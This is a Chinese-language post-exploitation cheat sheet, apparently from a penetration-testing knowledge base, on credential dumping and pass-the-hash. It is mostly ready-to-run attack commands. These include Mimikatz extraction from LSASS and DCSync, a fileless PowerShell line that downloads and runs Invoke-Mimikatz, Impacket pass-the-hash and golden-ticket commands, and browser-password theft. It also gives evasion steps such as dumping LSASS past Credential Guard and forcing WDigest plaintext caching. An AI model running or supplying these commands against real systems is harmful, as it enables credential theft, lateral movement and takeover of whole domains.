---
id: 05-003
title: "🔑 凭证转储与哈希传递 (Credential Dumping & Pass-the-Hash)"
category: 后渗透
category_en: Post-Exploitation
difficulty: ★★★★
tools: "Mimikatz, Secretsdump, Lazagne, ProcDump"
last_updated: 2025-07
tags: ["post-exploitation", "credential-access", "data-exfiltration", "remote-control"]
subdomain: post-exploitation
nist_csf: ["PR.AC-01", "PR.DS-05"]
mitre_attack: ["T1003", "T1555", "T1055", "T1021"]
---
# 🔑 凭证转储与哈希传递 (Credential Dumping & Pass-the-Hash)

## 概述
从被控系统中提取明文密码、NTLM哈希、Kerberos票据等凭证信息，并利用哈希传递(Pass-the-Hash)、票据传递(Pass-the-Ticket)等技术进行内网横向移动。

## 核心技能

### 1. Mimikatz 凭证提取

```batch
:: 以管理员身份运行Mimikatz
mimikatz.exe

:: 提升至DEBUG权限
privilege::debug

:: 从LSASS内存中提取明文密码和哈希
sekurlsa::logonpasswords

:: 提取所有登录会话的TGT/TGS票据
sekurlsa::tickets /export

:: 提取DPAPI主密钥
dpapi::masterkey /in:"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Protect\*" /rpc

:: 提取域控上的所有域哈希
:: (需要域管理员权限)
lsadump::dcsync /domain:target.com /all /csv
```

```powershell
# PowerShell远程加载Mimikatz (无文件落地)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'

# 仅提取凭据并输出为JSON
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"' | ConvertTo-Json

# 使用反射加载Mimikatz（更隐蔽）
$mimi = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-Content -Path 'mimikatzb64.txt')))
```

### 2. NTLM哈希提取

```bash
# 使用Impacket secretsdump (远程提取)
# 从SAM提取本地哈希
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# 从NTDS.dit提取域哈希 (需要域控访问)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 远程提取 (使用管理员凭据)
impacket-secretsdump domain/user:password@192.168.1.1

# 使用哈希远程
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain/user@192.168.1.1

# 使用wmiexec执行命令
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain/user@192.168.1.1
```

```powershell
# Windows - 使用reg导出SAM/SYSTEM
# 需要SYSTEM权限
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY

# 使用PowerShell提取
$samPath = "$env:TEMP\SAM"
$systemPath = "$env:TEMP\SYSTEM"
reg.exe save HKLM\SAM $samPath /y
reg.exe save HKLM\SYSTEM $systemPath /y
```

### 3. 哈希传递攻击 (Pass-the-Hash)

```batch
:: Mimikatz PTH
mimikatz.exe
privilege::debug
sekurlsa::pth /user:Administrator /domain:target /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

:: 将NTLM哈希注入到当前会话 -> 弹出CMD窗口
```

```bash
# 使用Impacket psexec传递哈希
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.1

# 使用wmiexec
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.1

# 使用atexec (计划任务)
impacket-atexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.1 whoami

# 使用smbexec (SMB执行)
impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.1

# 使用CrackMapExec批量PTH
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami
```

```powershell
# PowerShell远程利用PTH
# 先注入哈希
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:target /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0"'

# 然后在新会话中执行
Enter-PSSession -ComputerName 192.168.1.1 -Credential $cred
```

### 4. Kerberos票据传递 (Pass-the-Ticket)

```batch
:: 从LSASS提取票据
mimikatz
privilege::debug
sekurlsa::tickets /export

:: 将票据注入到当前会话
kerberos::ptt [0;12bd3]-2-0-60a10000-Administrator@krbtgt-TARGET.COM.kirbi
```

```bash
# 使用Impacket提取票据
impacket-ticketer -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-... -domain target.com Administrator

# 使用票据认证
export KRB5CCNAME=silver_ticket.ccache
impacket-psexec -k -no-pass target.com/Administrator@dc01.target.com

# 黄金票据制作 (需要KRBTGT哈希)
impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <domain_sid> -domain target.com Administrator
```

### 5. 浏览器凭据提取

```bash
# SharpChrome - 提取Chrome凭证
SharpChrome.exe logins /target:Chrome

# WebBrowserPassView - 提取所有浏览器密码
WebBrowserPassView.exe /stext passwords.txt

# Lazagne - 全平台凭据提取
lazagne.exe all
lazagne.exe browsers
lazagne.exe wifi
lazagne.exe mails

# LaZagne (Linux)
python3 lazagne.py all
python3 lazagne.py browsers
```

## 常见防御绕过

```powershell
# 1. 绕过Credential Guard
# 如果启用了Credential Guard和基于虚拟化的安全(VBS)，LSASS被隔离
# 使用内存转储方式
procdump64.exe -ma lsass.exe lsass.dmp

# 然后在攻击机离线分析
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# 2. 绕过Windows Defender实时保护
# 使用PowerShell无文件方式
# 或使用定制的mimikatz变种

# 3. WDigest降级攻击（强制开启明文密码缓存）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# 需要用户再次登录才能获取明文密码
```

## 凭证数据分级

| 优先级 | 凭证类型 | 来源 | 利用价值 |
|:---:|:---|:---|:---:|
| 🔴 关键 | KRBTGT哈希 | 域控 DC Sync | 黄金票据、完全控制域 |
| 🔴 关键 | 域管理员NTLM | LSASS/NTDS | 域控访问 |
| 🟠 高 | 本地管理员哈希 | SAM | 本机管理员 |
| 🟠 高 | 服务账户凭据 | LSASS/配置文件 | 横向移动 |
| 🟡 中 | 普通域用户NTLM | LSASS | 低权限横向 |
| 🟡 中 | 浏览器密码 | Chrome/Edge | 业务系统访问 |
| 🟢 低 | WiFi密码 | 配置文件 | 网络访问 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Mimikatz | Windows凭证提取与PTH | https://github.com/gentilkiwi/mimikatz |
| Impacket | 远程哈希传递工具集 | https://github.com/fortra/impacket |
| CrackMapExec | 内网渗透自动化 | https://github.com/byt3bl33d3r/CrackMapExec |
| Lazagne | 全平台密码提取 | https://github.com/AlessandroZ/LaZagne |
| ProcDump | 进程内存转储 | https://docs.microsoft.com/sysinternals/downloads/procdump |
| SharpChrome | Chrome数据提取 | https://github.com/GhostPack/SharpDPAPI |

## 参考资源

- [MITRE ATT&CK — OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003/)
- [MITRE ATT&CK — Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002/)
- [HackTricks — Credential Dumping](https://book.hacktricks.xyz/windows-hardening/credentials-credential-dumping)
- [PayloadsAllTheThings — Pass the Hash](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Pass%20the%20Hash.md)
